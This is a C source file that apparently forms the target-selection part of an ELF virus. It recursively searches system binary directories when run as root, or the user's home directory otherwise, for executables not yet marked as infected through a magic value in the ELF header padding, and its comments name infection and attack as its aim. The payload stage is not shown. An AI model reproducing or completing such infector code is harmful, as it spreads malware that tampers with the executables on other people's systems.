#include <stdio.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <elf.h>
#define MAGIC_NUMBER 0x15D25
static inline int get_random_number(int max_num)
{
    return rand() % 4;
}
static inline char *randomly_select_dir(char **dirs)
{
    return (char *)dirs[get_random_number(4)];
}
bool isELF(char *path, char *fileName)
{
    if (fileName[0] == '.')
        return false;

    int host_fd = open(path, O_RDONLY);

    char header[4];
    read(host_fd, header, 4);

    close(host_fd);

    return header[0] == 0x7f && header[1] == 'E' && header[2] == 'L' && header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the padding entry in the EI_PAD of elf header
 */
bool isHealthy(char *fileName)
{
    int fd = open(fileName, O_RDONLY);
    lseek(fd, EI_PAD, SEEK_SET);
    uint32_t flag;
    read(fd, &flag, 4);
    close(fd);
    return flag != MAGIC_NUMBER;
}
void getHealthyHostFile(char *retPath, char *self_name, char *name, int indent)
{
    DIR *dir;
    struct dirent *entry;
    struct stat st;
    if (!(dir = opendir(name)))
        return;

    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_type == DT_DIR)
        {
            char path[1024];
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0 || entry->d_name[0] == '.')
                continue;
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            getHealthyHostFile(retPath, self_name, path, indent + 2);
            if (retPath[0] != '\0')
                return;
        }
        else
        {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            stat(path, &st);
            if (!strcmp(entry->d_name, self_name))
                continue; // Don't infect self
            if (isELF(path, entry->d_name) && isHealthy(path))
            {
                // printf("%s\n",path);
                strcpy(retPath, path);
                closedir(dir);
                return;
            }
        }
    }
    closedir(dir);
    return;
}
void loadCleanHostfile(char *cleanHostName, char *self_name)
{
    char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin"};
    // Addresses of the directories to attack if the user of root
    //  char cwd[2] = {'.', '\0'};
    char attack[1024] = "/home/";
    char buf[64];
    cuserid(buf);
    strcat(attack, buf);
    char *selected_dir = getuid() != 0 ? attack : randomly_select_dir((char **)dirs);
    getHealthyHostFile(cleanHostName, self_name, selected_dir, 0);
}

void main(int argc, char *argv[])
{
    char cleanHostName[1024] = "\0";
    loadCleanHostfile(cleanHostName, (char *)argv[0] + 2);
    printf("Target File %s\n", cleanHostName);
}